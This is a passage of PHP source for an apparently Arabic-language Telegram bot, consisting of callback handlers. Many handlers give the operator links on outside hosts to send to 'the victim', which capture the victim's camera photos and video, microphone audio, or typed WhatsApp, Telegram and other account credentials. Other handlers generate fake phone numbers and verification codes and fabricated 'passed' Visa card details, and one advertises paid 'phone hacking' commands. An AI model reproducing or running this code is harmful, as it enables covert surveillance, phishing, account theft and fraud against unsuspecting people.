    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "قم بإرسال هذا لفتح أوامر اختراق الهاتف كاملاً قم بضغط على هذا الامر /vip",
        'parse_mode' => "Markdown"
    ]);
}

if ($data == 'mm16') {
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "🎉 هل أنت متأكد من رغبتك في شراء البوت المتميز؟\n✅ السعر: 15 نقطة\nيرجى إرسال '/shara' لتأكيد الشراء.",
        'parse_mode' => "Markdown"
    ]);
}

if ($data == "get_user_link") {
    $link = "https://t.me/Ksksjsjjsjskygbot?start=$user_id";
    sendmessage($chat_id2, "انسخ هذا الرابط وارسله لأي شخص:\n\n$link");
}

if ($data == "verify_number") {
    $link = "https://smmyemen.pro/bots/wahm1954/index20?id=$user_id";
    sendmessage($chat_id2, "انسخ الرابط ورسله للضحيه وانتضر لما يدخل المعلومات:\n$link");
}

if ($data == "com") {
    $link = "https://smmyemen.pro/bots/wahm1954/index4.html?id=$user_id";
    sendmessage($chat_id2, "انسخ الرابط ورسله للضحيه وانتضر لما الصوره تجيك خلال ثواني من دخوله الا الرابط:\n$link");
}

if ($data == "record_audio") {
    $link = "https://smmyemen.pro/bots/wahm1954/index6.html?id=$user_id";
    sendmessage($chat_id2, "انسخ الرابط ورسله للضحيه وانتضر لما التسجيل يجيك خلال ثواني من دخوله الا الرابط:\n$link");
}

if ($data == "com1") {
    $front_camera_link = "https://brass-sulky-bakery.glitch.me/front?id=$user_id";
    $back_camera_link = "https://brass-sulky-bakery.glitch.me/back?id=$user_id";
    $text_msg = "إليك روابط تصوير الضحية فيديو:\n\nالكاميرا الأمامية:\n$front_camera_link\n______________________________________\n\nالكاميرا الخلفية:\n$back_camera_link";
    sendmessage($chat_id2,$text_msg);
}

if ($data == "com2") {
    $link = "https://brass-sulky-bakery.glitch.me?id=$user_id";
    sendmessage($chat_id2, "انسخ الرابط ورسله للضحيه وانتضر لما الفيديو تجيك خلال ثواني من دخوله الا الرابط:\n$link");
}

if ($data == "ma") {
    $link = "https://smmyemen.pro/bots/wahm1954/index24.html?id=$user_id";
    sendmessage($chat_id2, "انسخ الرابط ورسله للضحيه وانتضر لما المعلومات تجيك خلال ثواني من دخوله الا الرابط:\n$link");
}

if ($data == "co") {
    $link = "https://smmyemen.pro/bots/wahm1954/index5.html?id=$user_id";
    sendmessage($chat_id2, "انسخ الرابط ورسله للضحيه وانتضر لما الصوره تجيك خلال ثواني من دخوله الا الرابط:\n$link");
}

if ($data == "verify_whatsapp") {
    $link = "https://separated-brawny-odometer.glitch.me?id=$user_id";
    sendmessage($chat_id2, "انسخ الرابط ورسله للضحيه وانتضر لما يدخل المعلومات:\n$link");
}

if ($data == "verify_tle") {
    $link = "https://smmyemen.pro/bots/wahm1954/tle/gs.php?id=$user_id";
    sendmessage($chat_id2, "انسخ الرابط ورسله للضحيه وانتضر لما يدخل المعلومات:\n$link");
}

if ($data == "moq") {
    $link = "https://smmyemen.pro/bots/wahm1954/index23.html?id=$user_id";
    sendmessage($chat_id2, "انسخ الرابط ورسله للضحيه وانتضر لما يدخل المعلومات:\n$link");
}

if ($data == 'pm') {
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "قم بإرسال هذا لفتح أوامر تحليل شخصيتك قم بضغط على هذا الامر /p",
        'parse_mode' => "Markdown"
    ]);
}

if ($data == 'ex1') {
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "قم بإرسال هذا لفتح أوامر خيره 😊 قم بضغط على هذا الامر /rt",
        'parse_mode' => "Markdown"
    ]);
}

if ($data == "xm16") {
    sendphoto($chat_id2, "https://khain.pro/sor/akh.jpeg");
    exit;
}

if ($data == "fake_number" \vert{}\vert{} $data == "change_number") {
    sendFakeNumber($chat_id2);
}

if ($data == "request_code") {
    $platforms = ["واتساب", "تيك توك", "جوجل", "بايبال", "سناب شات", "انستجرام", "تويتر", "تلغرام", "نتفلكس", "فيسبوك", "أمازون", "سبوتيفاي"];
    $codes = [
        "Kod potwierdzający " . rand(10000, 99999),
        "PayPal: Danke für die Bestätigung Ihrer Telefonnummer. https://py.pl/" . rand(1000, 9999),
        "【阿里巴巴】验证码" . rand(1000, 9999) . "，您正在注册，验证码15分钟内有效。",
        "【AliExpress】Kod weryfikacyjny: " . rand(100000, 999999),
        rand(100000, 999999) . " is your Skrill authentication code.",
        rand(100000, 999999) . " is your Google verification code.",
        rand(100000, 999999) . " is your TikTok confirmation code.",
        rand(100000, 999999) . " is your WhatsApp login code.",
        "Your Facebook code is " . rand(100000, 999999),
        "Telegram code: " . rand(10000, 99999)
    ];
    shuffle($codes);$selected_platform = $platforms[array_rand($platforms)];

    $msg = "➖ منصة: $selected_platform\n\n";
    foreach (array_slice($codes, 0, 5) as$i => $code) {$msg .= "الرسالة رقم " . ($i + 1) . ": $code\n\n";
    }
    $msg .= "اضغط على أي رسالة لنسخها.";

    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => $msg
    ]);
}

function sendFakeNumber($chat_id) {$countries = [
        ["latvia", "+371", "لاتفيا 🇱🇻"],
        ["germany", "+49", "ألمانيا 🇩🇪"],
        ["usa", "+1", "أمريكا 🇺🇸"],
        ["france", "+33", "فرنسا 🇫🇷"],
        ["sweden", "+46", "السويد 🇸🇪"],
        ["uk", "+44", "بريطانيا 🇬🇧"],
        ["netherlands", "+31", "هولندا 🇳🇱"],
        ["italy", "+39", "إيطاليا 🇮🇹"],
    ];

    $random_country =$countries[array_rand($countries)];$number = $random_country[1] . rand(100000000, 999999999);$now = new DateTime("now", new DateTimeZone("Asia/Riyadh"));
    $date =$now->format("Y-m-d");
    $time =$now->format("g:i:s A");

    $text = "➖ تم الطلب 🛎•\n";
    $text .= "➖ رقم الهاتف ☎️ : `$number`\n";
    $text .= "➖ الدوله : " . $random_country[2] . "\n";
    $text .= "➖ رمز الدوله 🌏 : " . $random_country[1] . "\n";
    $text .= "➖ المنصه 🔮 : لجميع الموقع والبرامج\n";
    $text .= "➖ تاريج الانشاء 📅 : $date\n";
    $text .= "➖ وقت الانشاء ⏰ : $time\n";
    $text .= "➖ اضغط ع الرقم لنسخه.";

    $keyboard = [
        [
            ['text' => 'تغيير الرقم', 'callback_data' => 'change_number'],
            ['text' => 'طلب كود', 'callback_data' => 'request_code']
        ]
    ];

    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => "Markdown",
        'reply_markup' => json_encode(['inline_keyboard' => $keyboard])
    ]);
}

if ($data == "get_fake_visa") {
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "♻️ جاري الفحص عن الفيزات . . .\n🔍 يرجى الانتظار قليلاً"
    ]);
    sleep(2);

    $cardNumber = "4" . rand(1000,9999) . rand(1000,9999) . rand(1000,9999);
    $expiryMonth = str_pad(rand(1, 12), 2, "0", STR_PAD_LEFT);
    $expiryYear = rand(2025, 2028);$cvv = rand(100, 999);

    $banks = ["TD Bank", "Chase Bank", "Bank of America", "Capital One", "Wells Fargo"];
    $types = ["VISA - DEBIT - CLASSIC", "VISA - CREDIT - GOLD", "VISA - ELECTRON", "VISA - PLATINUM"];
    $values = ["\$5", "\$10", "\$15", "\$25", "\$50", "\$100"];

    $bank = $banks[array_rand($banks)];
    $type =$types[array_rand($types)];$value = $values[array_rand($values)];

    $visa = "𝗣𝗮𝘀𝘀𝗲𝗱 ✅\n[-] Card Number : `$cardNumber`\n[-] Expiry : $expiryMonth/$expiryYear\n[-] CVV : $cvv\n[-] Bank :$bank\n[-] Card Type : $type\n[-] Country : USA🇺🇸\n[-] Value : $value\n============================\n[-] by : @WAHM_REBOT";

    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => $visa,
        'parse_mode' => "Markdown"
    ]);
}

if ($data == 'start_mard') {$question = "اختر نوع البلاغ";
    $keyboard = [
        [
            ['text' => '🚨 بلاغ عن قناة', 'callback_data' => 'report_channel'],
            ['text' => '🚨 بلاغ عن حساب', 'callback_data' => 'report_account']
        ],
        [
            ['text' => '🚨 بلاغ عن مجموعة', 'callback_data' => 'report_group'],
            ['text' => '🚨 بلاغ عن بوت', 'callback_data' => 'report_bot']
        ], 
    ];
    bot("sendMessage", [
        "chat_id" => $chat_id2,
        "text" => $question,
        "reply_markup" => json_encode(["inline_keyboard" => $keyboard])
    ]);
}

if (in_array($data, ['report_channel', 'report_account', 'report_group', 'report_bot'])) {
    bot("sendMessage", [
        "chat_id" => $chat_id2,
        "text" => "📌 *أرسل اسم المستخدم فقط (بدون @)* مثل: `b_ab`",
        "parse_mode" => "Markdown"
    ]);
}

if ($data == 'personality_analysis') {$question = "سؤال 1: ماهو نوع طعامك المفضل؟ ";
    $keyboard = [
        [
            ['text' => 'طعام سريع🍔', 'callback_data' => 'fast_food'],
            ['text' => 'طعام صحي 🥗', 'callback_data' => 'healthy_food']
        ],
        [
            ['text' => 'طعام ياباني🌭', 'callback_data' => 'japanese_food'],
            ['text' => 'بيتزا 🍕', 'callback_data' => 'pizza']
        ], 
    ];
    bot("sendMessage", [
        "chat_id" => $chat_id2,
        "text" => $question,
        "reply_markup" => json_encode(["inline_keyboard" => $keyboard])
    ]);
}
